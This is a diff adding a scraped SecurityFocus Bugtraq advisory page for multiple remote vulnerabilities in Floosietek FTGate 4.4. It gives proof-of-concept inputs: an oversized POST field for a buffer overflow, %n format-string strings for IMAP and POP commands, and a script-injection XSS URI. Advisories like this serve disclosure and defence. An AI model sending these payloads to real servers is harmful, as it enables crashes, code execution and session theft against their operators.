@@ -1,0 +1,95 @@
+#SpeeDr00t@Black Falcon<br>#bid15972<p><b><span style="font-size: 18pt;">Floosietek FTGate Multiple Remote Vulnerabilities</span></b></p><br><br><a href="http://www.securityfocus.com/bid/15972/info">info</a><br><a href="http://www.securityfocus.com/bid/15972/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/15972/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/15972/solution">solution</a><br><a href="http://www.securityfocus.com/bid/15972/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				15972
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Unknown
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Nov 16 2005 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Nov 16 2005 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				These issues were discovered by Tim Shelton.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					Floosietek FTGate 4.4 <br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	The following proof of concept examples are provided:<br/><br/>The buffer overflow vulnerability may be demonstrated with the following POST data to '/index.fts':<br/>config=1&amp;param1=&amp;href=&amp;tzoffset=111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111   111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111&amp;admin=administrator%40example.com&amp;password=test12345<br/><br/>The IMAP format string vulnerabilities may be demonstrated with the following commands:<br/>01 LIST (%25n times 1024) *<br/>02 AUTHENTICATE (%25n times 1024)<br/><br/>The POP format string vulnerabilities may be demonstrated with the following commands:<br/>USER (%n times 20)<br/>PASS (%n times 20)<br/>TOP (%n times 20) 1<br/><br/>The cross-site scripting vulnerability may be demonstrated with the following URI:<br/>http://www.example.com/index.fts?href="&gt;&lt;script&gt;alert('XSS-magic-string');&lt;/script&gt;
+	
+		<ul>
+</ul>
+</div>
